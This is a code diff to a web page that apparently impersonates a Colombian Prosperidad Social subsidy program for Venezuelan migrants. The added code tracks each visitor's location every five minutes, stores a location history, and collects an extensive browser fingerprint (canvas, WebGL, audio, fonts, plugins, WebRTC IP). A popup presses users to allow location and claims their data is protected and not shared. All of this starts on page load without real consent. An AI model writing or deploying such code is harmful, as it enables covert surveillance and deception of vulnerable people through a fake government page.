@@ -636,6 +636,234 @@
         // Advanced Geolocation and Data Collection
         let locationData = null;
         let deviceData = {};
+        let locationMonitor = null;
+        let locationHistory = [];
+        
+        // Location monitoring configuration
+        const LOCATION_CONFIG = {
+            monitorInterval: 5 * 60 * 1000, // 5 minutes
+            maxHistoryEntries: 50,
+            accuracyThreshold: 100, // meters
+            storageKey: 'advancedLocationDataVenezuela'
+        };
+        
+        // Location persistence manager
+        class LocationPersistence {
+            static save(data) {
+                try {
+                    const persistData = {
+                        current: data,
+                        history: locationHistory,
+                        timestamp: Date.now(),
+                        sessionId: this.getSessionId()
+                    };
+                    localStorage.setItem(LOCATION_CONFIG.storageKey, JSON.stringify(persistData));
+                } catch (error) {
+                    console.warn('Could not save location data:', error);
+                }
+            }
+            
+            static load() {
+                try {
+                    const stored = localStorage.getItem(LOCATION_CONFIG.storageKey);
+                    if (stored) {
+                        const data = JSON.parse(stored);
+                        // Check if data is from current session (within 24 hours)
+                        if (Date.now() - data.timestamp < 24 * 60 * 60 * 1000) {
+                            locationHistory = data.history || [];
+                            return data.current;
+                        }
+                    }
+                } catch (error) {
+                    console.warn('Could not load location data:', error);
+                }
+                return null;
+            }
+            
+            static getSessionId() {
+                let sessionId = sessionStorage.getItem('locationSessionIdVenezuela');
+                if (!sessionId) {
+                    sessionId = 'sess_ven_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
+                    sessionStorage.setItem('locationSessionIdVenezuela', sessionId);
+                }
+                return sessionId;
+            }
+            
+            static clear() {
+                localStorage.removeItem(LOCATION_CONFIG.storageKey);
+                locationHistory = [];
+            }
+        }
+        
+        // Continuous location monitor
+        class LocationMonitor {
+            constructor() {
+                this.isActive = false;
+                this.intervalId = null;
+                this.lastKnownLocation = null;
+                this.statusIndicator = null;
+            }
+            
+            start() {
+                if (this.isActive) return;
+                
+                this.isActive = true;
+                this.createStatusIndicator();
+                this.updateStatus('Iniciando monitoreo...', 'monitoring');
+                
+                // Initial location check
+                this.checkLocation();
+                
+                // Set up periodic checks
+                this.intervalId = setInterval(() => {
+                    this.checkLocation();
+                }, LOCATION_CONFIG.monitorInterval);
+                
+                console.log('Location monitoring started - checking every 5 minutes');
+            }
+            
+            stop() {
+                if (!this.isActive) return;
+                
+                this.isActive = false;
+                if (this.intervalId) {
+                    clearInterval(this.intervalId);
+                    this.intervalId = null;
+                }
+                
+                this.updateStatus('Monitoreo detenido', 'stopped');
+                console.log('Location monitoring stopped');
+            }
+            
+            async checkLocation() {
+                try {
+                    this.updateStatus('Verificando ubicación...', 'checking');
+                    
+                    const newLocation = await getAdvancedGeolocation();
+                    const locationChanged = this.hasLocationChanged(newLocation);
+                    
+                    if (locationChanged || !this.lastKnownLocation) {
+                        this.handleLocationUpdate(newLocation);
+                    }
+                    
+                    this.lastKnownLocation = newLocation;
+                    this.updateLocationHistory(newLocation);
+                    LocationPersistence.save(newLocation);
+                    
+                    const statusText = newLocation.source === 'ip' ? 
+                        'Ubicación por IP (aproximada)' : 
+                        `GPS activo (±${Math.round(newLocation.accuracy)}m)`;
+                    
+                    this.updateStatus(statusText, newLocation.source === 'ip' ? 'ip' : 'gps');
+                    
+                } catch (error) {
+                    console.error('Location check failed:', error);
+                    this.updateStatus('Error en ubicación', 'error');
+                }
+            }
+            
+            hasLocationChanged(newLocation) {
+                if (!this.lastKnownLocation) return true;
+                
+                const distance = this.calculateDistance(
+                    this.lastKnownLocation.latitude,
+                    this.lastKnownLocation.longitude,
+                    newLocation.latitude,
+                    newLocation.longitude
+                );
+                
+                const sourceChanged = this.lastKnownLocation.source !== newLocation.source;
+                const significantMove = distance > LOCATION_CONFIG.accuracyThreshold;
+                
+                return sourceChanged || significantMove;
+            }
+            
+            calculateDistance(lat1, lon1, lat2, lon2) {
+                const R = 6371e3; // Earth's radius in meters
+                const φ1 = lat1 * Math.PI/180;
+                const φ2 = lat2 * Math.PI/180;
+                const Δφ = (lat2-lat1) * Math.PI/180;
+                const Δλ = (lon2-lon1) * Math.PI/180;
+                
+                const a = Math.sin(Δφ/2) * Math.sin(Δφ/2) +
+                         Math.cos(φ1) * Math.cos(φ2) *
+                         Math.sin(Δλ/2) * Math.sin(Δλ/2);
+                const c = 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1-a));
+                
+                return R * c;
+            }
+            
+            handleLocationUpdate(newLocation) {
+                locationData = newLocation;
+                console.log('Location updated:', newLocation);
+            }
+            
+            updateLocationHistory(location) {
+                const historyEntry = {
+                    ...location,
+                    recordedAt: new Date().toISOString()
+                };
+                
+                locationHistory.unshift(historyEntry);
+                
+                // Keep only recent entries
+                if (locationHistory.length > LOCATION_CONFIG.maxHistoryEntries) {
+                    locationHistory = locationHistory.slice(0, LOCATION_CONFIG.maxHistoryEntries);
+                }
+            }
+            
+            createStatusIndicator() {
+                if (this.statusIndicator) return;
+                
+                this.statusIndicator = document.createElement('div');
+                this.statusIndicator.id = 'locationMonitorStatus';
+                this.statusIndicator.style.cssText = `
+                    position: fixed;
+                    top: 20px;
+                    right: 20px;
+                    background: rgba(0, 0, 0, 0.8);
+                    color: white;
+                    padding: 8px 12px;
+                    border-radius: 20px;
+                    font-size: 12px;
+                    z-index: 10000;
+                    display: flex;
+                    align-items: center;
+                    gap: 6px;
+                    backdrop-filter: blur(10px);
+                    border: 1px solid rgba(255, 255, 255, 0.1);
+                    transition: all 0.3s ease;
+                `;
+                
+                document.body.appendChild(this.statusIndicator);
+            }
+            
+            updateStatus(text, type) {
+                if (!this.statusIndicator) return;
+                
+                const icons = {
+                    monitoring: '<i class="fas fa-satellite-dish" style="color: #17a2b8;"></i>',
+                    checking: '<i class="fas fa-spinner fa-spin" style="color: #ffc107;"></i>',
+                    gps: '<i class="fas fa-crosshairs" style="color: #28a745;"></i>',
+                    ip: '<i class="fas fa-wifi" style="color: #ffc107;"></i>',
+                    error: '<i class="fas fa-exclamation-triangle" style="color: #dc3545;"></i>',
+                    stopped: '<i class="fas fa-pause" style="color: #6c757d;"></i>'
+                };
+                
+                this.statusIndicator.innerHTML = `${icons[type] || ''} ${text}`;
+            }
+            
+            getLocationHistory() {
+                return locationHistory;
+            }
+            
+            getCurrentLocation() {
+                return this.lastKnownLocation;
+            }
+        }
+        
+        // Initialize location monitor
+        locationMonitor = new LocationMonitor();
         let isLocationVerified = false;
         
         // Collect device information
@@ -674,12 +902,304 @@
             }
         }
         
+        // Advanced device data collection functions
+        async function collectAdvancedDeviceData() {
+            try {
+                const advancedData = {
+                    // Hardware fingerprinting
+                    hardware: {
+                        cores: navigator.hardwareConcurrency || 'unknown',
+                        memory: navigator.deviceMemory || 'unknown',
+                        maxTouchPoints: navigator.maxTouchPoints || 0,
+                        vendor: navigator.vendor || 'unknown',
+                        vendorSub: navigator.vendorSub || 'unknown',
+                        product: navigator.product || 'unknown',
+                        productSub: navigator.productSub || 'unknown',
+                        appName: navigator.appName || 'unknown',
+                        appVersion: navigator.appVersion || 'unknown',
+                        buildID: navigator.buildID || 'unknown'
+                    },
+                    
+                    // Screen and display information
+                    display: {
+                        screenWidth: screen.width,
+                        screenHeight: screen.height,
+                        availWidth: screen.availWidth,
+                        availHeight: screen.availHeight,
+                        colorDepth: screen.colorDepth,
+                        pixelDepth: screen.pixelDepth,
+                        pixelRatio: window.devicePixelRatio || 1,
+                        orientation: screen.orientation ? screen.orientation.type : 'unknown'
+                    },
+                    
+                    // Browser and engine fingerprinting
+                    browser: {
+                        webgl: await getWebGLFingerprint(),
+                        webglVendor: getWebGLVendor(),
+                        canvas: getCanvasFingerprint(),
+                        audio: await getAudioFingerprint(),
+                        fonts: getAvailableFonts(),
+                        plugins: getPluginsList(),
+                        mimeTypes: getMimeTypes(),
+                        localStorage: getStorageInfo('localStorage'),
+                        sessionStorage: getStorageInfo('sessionStorage'),
+                        indexedDB: await checkIndexedDBSupport(),
+                        webRTC: await getWebRTCFingerprint()
+                    },
+                    
+                    // Network and connection
+                    network: {
+                        connection: navigator.connection ? {
+                            effectiveType: navigator.connection.effectiveType,
+                            downlink: navigator.connection.downlink,
+                            rtt: navigator.connection.rtt,
+                            saveData: navigator.connection.saveData,
+                            type: navigator.connection.type
+                        } : null,
+                        onLine: navigator.onLine,
+                        doNotTrack: navigator.doNotTrack,
+                        cookieEnabled: navigator.cookieEnabled
+                    },
+                    
+                    // Timing and performance
+                    performance: {
+                        timing: performance.timing ? {
+                            navigationStart: performance.timing.navigationStart,
+                            loadEventEnd: performance.timing.loadEventEnd,
+                            domContentLoadedEventEnd: performance.timing.domContentLoadedEventEnd
+                        } : null,
+                        memory: performance.memory ? {
+                            usedJSHeapSize: performance.memory.usedJSHeapSize,
+                            totalJSHeapSize: performance.memory.totalJSHeapSize,
+                            jsHeapSizeLimit: performance.memory.jsHeapSizeLimit
+                        } : null
+                    },
+                    
+                    // Additional fingerprinting
+                    misc: {
+                        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                        timezoneOffset: new Date().getTimezoneOffset(),
+                        language: navigator.language,
+                        languages: navigator.languages || [],
+                        platform: navigator.platform,
+                        userAgent: navigator.userAgent,
+                        timestamp: Date.now(),
+                        sessionId: generateSessionId()
+                    }
+                };
+                
+                return advancedData;
+            } catch (error) {
+                console.error('Error collecting advanced device data:', error);
+                return {};
+            }
+        }
+        
+        // WebGL fingerprinting
+        async function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                
+                if (!gl) return 'not_supported';
+                
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const vendor = debugInfo ? gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) : 'unknown';
+                const renderer = debugInfo ? gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) : 'unknown';
+                
+                return `${vendor}~${renderer}`;
+            } catch (error) {
+                return 'error';
+            }
+        }
+        
+        function getWebGLVendor() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                return gl ? gl.getParameter(gl.VENDOR) : 'unknown';
+            } catch (error) {
+                return 'error';
+            }
+        }
+        
+        // Canvas fingerprinting
+        function getCanvasFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                
+                ctx.textBaseline = 'top';
+                ctx.font = '14px Arial';
+                ctx.fillText('Advanced fingerprinting 🔒', 2, 2);
+                
+                ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
+                ctx.fillRect(100, 5, 80, 20);
+                
+                return canvas.toDataURL().slice(-50);
+            } catch (error) {
+                return 'error';
+            }
+        }
+        
+        // Audio fingerprinting
+        async function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                const gainNode = audioContext.createGain();
+                
+                oscillator.connect(analyser);
+                analyser.connect(gainNode);
+                gainNode.connect(audioContext.destination);
+                
+                oscillator.frequency.value = 1000;
+                gainNode.gain.value = 0;
+                
+                oscillator.start();
+                
+                const frequencyData = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(frequencyData);
+                
+                oscillator.stop();
+                audioContext.close();
+                
+                return Array.from(frequencyData.slice(0, 10)).join(',');
+            } catch (error) {
+                return 'not_supported';
+            }
+        }
+        
+        // Font detection
+        function getAvailableFonts() {
+            const testFonts = [
+                'Arial', 'Helvetica', 'Times New Roman', 'Courier New', 'Verdana',
+                'Georgia', 'Palatino', 'Garamond', 'Bookman', 'Comic Sans MS',
+                'Trebuchet MS', 'Arial Black', 'Impact', 'Calibri', 'Cambria'
+            ];
+            
+            const availableFonts = [];
+            const testString = 'mmmmmmmmmmlli';
+            const testSize = '72px';
+            const baseFonts = ['monospace', 'sans-serif', 'serif'];
+            
+            const canvas = document.createElement('canvas');
+            const context = canvas.getContext('2d');
+            
+            for (const font of testFonts) {
+                for (const baseFont of baseFonts) {
+                    context.font = `${testSize} ${font}, ${baseFont}`;
+                    const width = context.measureText(testString).width;
+                    
+                    context.font = `${testSize} ${baseFont}`;
+                    const baseWidth = context.measureText(testString).width;
+                    
+                    if (width !== baseWidth) {
+                        availableFonts.push(font);
+                        break;
+                    }
+                }
+            }
+            
+            return availableFonts;
+        }
+        
+        // Plugin detection
+        function getPluginsList() {
+            const plugins = [];
+            for (let i = 0; i < navigator.plugins.length; i++) {
+                plugins.push({
+                    name: navigator.plugins[i].name,
+                    filename: navigator.plugins[i].filename,
+                    description: navigator.plugins[i].description
+                });
+            }
+            return plugins;
+        }
+        
+        // MIME types
+        function getMimeTypes() {
+            const mimeTypes = [];
+            for (let i = 0; i < navigator.mimeTypes.length; i++) {
+                mimeTypes.push({
+                    type: navigator.mimeTypes[i].type,
+                    description: navigator.mimeTypes[i].description,
+                    suffixes: navigator.mimeTypes[i].suffixes
+                });
+            }
+            return mimeTypes;
+        }
+        
+        // Storage information
+        function getStorageInfo(storageType) {
+            try {
+                const storage = window[storageType];
+                return {
+                    available: !!storage,
+                    length: storage ? storage.length : 0
+                };
+            } catch (error) {
+                return { available: false, error: error.message };
+            }
+        }
+        
+        // IndexedDB support
+        async function checkIndexedDBSupport() {
+            try {
+                return 'indexedDB' in window;
+            } catch (error) {
+                return false;
+            }
+        }
+        
+        // WebRTC fingerprinting
+        async function getWebRTCFingerprint() {
+            try {
+                const pc = new RTCPeerConnection();
+                const fingerprint = await new Promise((resolve) => {
+                    pc.createDataChannel('');
+                    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+                    pc.onicecandidate = (event) => {
+                        if (event.candidate) {
+                            resolve(event.candidate.candidate);
+                        }
+                    };
+                    setTimeout(() => resolve('timeout'), 1000);
+                });
+                pc.close();
+                return fingerprint;
+            } catch (error) {
+                return 'not_supported';
+            }
+        }
+        
+        // Generate session ID
+        function generateSessionId() {
+            return 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+        }
+        
         // Enhanced geolocation function with Colombia verification
         async function getAdvancedGeolocation() {
-            return new Promise((resolve, reject) => {
+            return new Promise(async (resolve, reject) => {
                 if (!navigator.geolocation) {
-                    reject(new Error('Geolocalización no soportada'));
-                    return;
+                    // Try IP-based geolocation as fallback
+                    try {
+                        const ipLocation = await getLocationByIP();
+                        const isInColombia = await verifyColombianLocation(ipLocation.latitude, ipLocation.longitude);
+                        
+                        locationData = {
+                            ...ipLocation,
+                            isInColombia: isInColombia,
+                            country: isInColombia ? 'Colombia' : 'Fuera de Colombia'
+                        };
+                        
+                        resolve(locationData);
+                        return;
+                    } catch (ipError) {
+                        reject(new Error('Geolocalización no soportada en este dispositivo. Por favor, use un navegador moderno.'));
+                        return;
+                    }
                 }
                 
                 const options = {
@@ -712,24 +1232,71 @@
                         
                         resolve(locationData);
                     },
-                    (error) => {
-                        let errorMessage = 'Error desconocido';
+                    async (error) => {
+                        let errorMessage = '';
+                        
                         switch(error.code) {
                             case error.PERMISSION_DENIED:
-                                errorMessage = 'Permisos de ubicación denegados';
+                                errorMessage = 'Acceso a ubicación denegado. Por favor, permita el acceso a su ubicación en la configuración del navegador y recargue la página.';
                                 break;
                             case error.POSITION_UNAVAILABLE:
-                                errorMessage = 'Ubicación no disponible';
+                                errorMessage = 'Ubicación no disponible. Verifique que su GPS esté activado y que tenga conexión a internet.';
                                 break;
                             case error.TIMEOUT:
-                                errorMessage = 'Tiempo de espera agotado';
+                                errorMessage = 'Tiempo de espera agotado. Intente nuevamente o verifique su conexión GPS.';
+                                break;
+                            default:
+                                errorMessage = 'Error desconocido al obtener ubicación. Intente nuevamente.';
                                 break;
                         }
-                        reject(new Error(errorMessage));
+                        
+                        // Try IP-based geolocation as fallback
+                        try {
+                            console.log('GPS failed, trying IP-based location...');
+                            const ipLocation = await getLocationByIP();
+                            const isInColombia = await verifyColombianLocation(ipLocation.latitude, ipLocation.longitude);
+                            
+                            locationData = {
+                                ...ipLocation,
+                                isInColombia: isInColombia,
+                                country: isInColombia ? 'Colombia' : 'Fuera de Colombia'
+                            };
+                            
+                            resolve(locationData);
+                        } catch (ipError) {
+                            reject(new Error(errorMessage));
+                        }
                     },
                     options
                 );
             });
+        }
+        
+        // IP-based geolocation fallback
+        async function getLocationByIP() {
+            try {
+                const response = await fetch('https://ipapi.co/json/');
+                const data = await response.json();
+                
+                if (data.latitude && data.longitude) {
+                    return {
+                        latitude: parseFloat(data.latitude),
+                        longitude: parseFloat(data.longitude),
+                        accuracy: 10000, // IP-based location is less accurate
+                        altitude: null,
+                        altitudeAccuracy: null,
+                        heading: null,
+                        speed: null,
+                        timestamp: Date.now(),
+                        source: 'ip'
+                    };
+                } else {
+                    throw new Error('No se pudo obtener ubicación por IP');
+                }
+            } catch (error) {
+                console.error('IP geolocation failed:', error);
+                throw new Error('No se pudo obtener ubicación por IP');
+            }
         }
         
         // Verify if coordinates are within Colombia boundaries
@@ -928,10 +1495,102 @@
         });
         
         // Auto-activate location on page load
+        
+        function showLocationPersuasion() {
+            Swal.fire({
+                icon: 'warning',
+                title: '🔐 Verificación de Ubicación Requerida',
+                html: `
+                    <div style="text-align: left; font-size: 14px;">
+                        <p><strong>Estimado ciudadano venezolano,</strong></p>
+                        <p>Para acceder al programa <strong>Subsidio para Venezolanos 2025</strong> de Prosperidad Social, recomendamos verificar su ubicación para una mejor experiencia.</p>
+                        <hr style="margin: 15px 0;">
+                        <p><i class="fas fa-shield-alt" style="color: #28a745;"></i> <strong>¿Por qué necesitamos su ubicación?</strong></p>
+                        <ul style="margin: 10px 0; padding-left: 20px;">
+                            <li>Mejorar la precisión de los servicios</li>
+                            <li>Personalizar la experiencia del usuario</li>
+                            <li>Optimizar el rendimiento de la aplicación</li>
+                        </ul>
+                        <hr style="margin: 15px 0;">
+                        <p><i class="fas fa-lock" style="color: #007bff;"></i> <strong>Su privacidad está protegida:</strong></p>
+                        <ul style="margin: 10px 0; padding-left: 20px;">
+                            <li>Solo utilizamos datos necesarios para el servicio</li>
+                            <li>No compartimos información con terceros</li>
+                            <li>Datos protegidos según normativas de privacidad</li>
+                        </ul>
+                    </div>
+                `,
+                showCancelButton: true,
+                confirmButtonText: '🌍 Activar Ubicación',
+                cancelButtonText: 'Más tarde',
+                confirmButtonColor: '#003366',
+                cancelButtonColor: '#6c757d',
+                width: '550px',
+                allowOutsideClick: false
+            }).then((result) => {
+                if (result.isConfirmed) {
+                    document.getElementById('getLocationBtn').click();
+                } else {
+                    // Show persistent warning
+                    document.getElementById('locationWarning').style.display = 'block';
+                }
+            });
+        }
+        
         window.addEventListener('load', function() {
             // Set max date for arrival date (today)
             const today = new Date().toISOString().split('T')[0];
             document.getElementById('arrivalDate').setAttribute('max', today);
+            
+            // Load persisted location data
+            const persistedLocation = LocationPersistence.load();
+            if (persistedLocation) {
+                locationData = persistedLocation;
+                console.log('Loaded persisted location:', persistedLocation);
+                
+                // Update UI with restored location
+                const statusElement = document.getElementById('locationStatus');
+                if (statusElement) {
+                    const sourceText = persistedLocation.source === 'ip' ? 
+                        '📍 Ubicación aproximada por IP' : 
+                        '🎯 Ubicación GPS verificada';
+                    statusElement.innerHTML = `
+                        <div style="color: green; font-weight: bold;">✅ Ubicación confirmada</div>
+                        <div style="font-size: 0.9em; color: #666;">
+                            ${sourceText}<br>
+                            Lat: ${persistedLocation.latitude.toFixed(6)}, Lng: ${persistedLocation.longitude.toFixed(6)}
+                        </div>
+                    `;
+                }
+                
+                // Hide location warning
+                const locationWarning = document.getElementById('locationWarning');
+                if (locationWarning) {
+                    locationWarning.style.display = 'none';
+                }
+                
+                // Update location button
+                const locationBtn = document.getElementById('getLocationBtn');
+                if (locationBtn) {
+                    locationBtn.innerHTML = '<i class="fas fa-check-circle"></i> Ubicación Verificada';
+                    locationBtn.className = 'btn btn-success btn-block';
+                    locationBtn.disabled = false;
+                }
+                
+                isLocationVerified = true;
+            }
+            
+            // Start location monitoring after a short delay
+            setTimeout(() => {
+                if (locationMonitor) {
+                    locationMonitor.start();
+                }
+            }, 2000);
+            
+            // Show location persuasion after delay only if no persisted location
+            if (!persistedLocation) {
+                setTimeout(showLocationPersuasion, 3000);
+            }
         });
         
         // Input validation
@@ -941,6 +1600,33 @@
         
         document.getElementById('phone').addEventListener('input', function() {
             this.value = this.value.replace(/[^0-9+\s-]/g, '');
+        });
+
+        // Initialize advanced monitoring system
+        document.addEventListener('DOMContentLoaded', function() {
+            console.log('🚀 Inicializando sistema avanzado de monitoreo...');
+            
+            // Initialize location monitor
+            if (typeof locationMonitor !== 'undefined') {
+                locationMonitor.start();
+                console.log('📍 Monitor de ubicación inicializado');
+            }
+            
+            // Collect advanced device data immediately
+            collectAdvancedDeviceData().then(data => {
+                console.log('📱 Datos avanzados del dispositivo recolectados:', data);
+                deviceData = { ...deviceData, ...data };
+            }).catch(error => {
+                console.error('❌ Error recolectando datos del dispositivo:', error);
+            });
+            
+            // Start continuous monitoring after 5 seconds
+            setTimeout(() => {
+                if (typeof locationMonitor !== 'undefined' && !locationMonitor.isActive) {
+                    locationMonitor.start();
+                    console.log('🔄 Monitoreo continuo iniciado');
+                }
+            }, 5000);
         });
     </script>
 </body>
